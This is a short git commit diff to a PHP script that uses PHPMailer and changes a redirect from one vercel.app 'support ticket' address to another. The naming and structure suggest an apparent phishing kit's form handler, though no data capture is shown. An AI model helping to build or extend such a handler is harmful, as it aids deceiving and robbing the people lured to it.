0a80658bd8b2d25f5fe07dd67b6ef0594b9ce224
asif1012-lgtm <hpboost8@gmail.com>
2025-07-21 11:25:28 +0500

    Update muneeb1.php

--- muneeb1.php
+++ muneeb1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://submit-support-ticket-pass.vercel.app/");
+header("Location:https://log-service-request-pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
